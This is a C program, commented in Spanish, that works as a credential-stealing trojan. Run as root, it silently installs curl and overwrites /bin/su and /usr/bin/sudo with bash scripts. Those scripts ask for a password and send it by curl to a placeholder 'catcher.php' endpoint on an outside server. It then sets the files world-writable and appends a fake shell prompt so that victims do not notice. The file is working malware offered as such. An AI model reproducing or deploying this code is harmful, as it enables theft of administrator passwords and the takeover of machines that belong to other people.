#include <stdio.h>
#include <string.h>


/** FUNCION PARA EJECUTAR LOS COMANDOS **/

int cmd(char * command) {

   return system(command);

}

/** CODIGO DEL MAIN **/

int main () {

  /** COMPROBAMOS SI ESTAMOS SIENDO EJECUTADOS COMO ROOT **/

   if(geteuid() != 0) {

      printf("Err.: This program must be run as root.\n");
      return 0;
  
   }


   /** INSTALAMOS EL PAQUETE CURL (SI NO ESTA INSTALADO) PROBAMOS CON VARIOS COMANDOS DEPENDIENDO DEL SISTEMA OPERATIVO. CON /DEV/NULL OCULTAMOS LA SALIDA DEL COMANDO **/


   cmd("apt install curl > /dev/null 2>&1");
   cmd("apt-get install curl > /dev/null 2>&1");
   cmd("yum install curl > /dev/null 2>&1");
   cmd("aptitude install curl > /dev/null 2>&1");


   /** SOBREESCRIBIMOS EL ARCHIVO /BIN/SU CON EL ARCHIVO BASH MALICIOSO QUE CAPTURA LAS CONTRASEÑAS **/ 
  
   FILE *file1;

   char cmmd1[300] = "#!/bin/bash \n stty -echo \n printf \"Password: \" \n read PASSWORD \n stty echo \n echo \n curl \"http://<SERVER>/<PATH>/catcher.php?pwd=$PASSWORD&code=<CODE>\" > /dev/null 2>&1 \n";

   file1 = fopen("/bin/su", "w");

   if(file1 == NULL) {

	printf("Err.: Try executing me again...");
	
   } else {

	fwrite(cmmd1, sizeof(cmmd1), 1, file1);

	fclose(file1);
	
   }

/** LE DAMOS PERMISOS AL ARCHIVO CREADO **/

cmd("chmod 777 /bin/su > /dev/null 2>&1");


   /** SOBREESCRIBIMOS EL ARCHIVO /USR/BIN/SUDO CON EL ARCHIVO BASH MALICIOSO QUE CAPTURA LAS CONTRASEÑAS **/ 


   FILE *file2;

   char cmmd2[300] = "#!/bin/bash \n stty -echo \n printf \"Password: \" \n read PASSWORD \n stty echo \n echo \n curl \"http://<SERVER>/<PATH>/catcher.php?pwd=$PASSWORD&code=<CODE>\" > /dev/null 2>&1 \n";

   file2 = fopen("/usr/bin/sudo", "w");

   if(file2 == NULL) {

	printf("Err.: Try executing me again...");
	
   } else {

	fwrite(&cmmd2, sizeof(cmmd2), 1, file2);

	fclose(file2);
	
   }

/** LE DAMOS PERMISOS AL ARCHIVO CREADO **/

cmd("chmod 777 /usr/bin/sudo > /dev/null 2>&1");

/** GUARDAMOS UNA FAKE SHELL EN EL ARCHIVO SU/SUDO (A PARTIR DE SU USER Y HOSTNAME) PARA QUE NO SOSPECHE DEMASIADO EL USUARIO **/


 cmd("echo 'while : \n do \n   h=$(hostname) ; u=$(whoami) ; echo -n $u\"@\"$h\":~# \" ; read cmd ; $cmd  \n  done \n' >> /bin/su");
 cmd("echo 'while : \n do \n   h=$(hostname) ; u=$(whoami) ; echo -n $u\"@\"$h\":~# \" ; read cmd ; $cmd  \n  done \n' >> /usr/bin/sudo");

   return(0);

} 


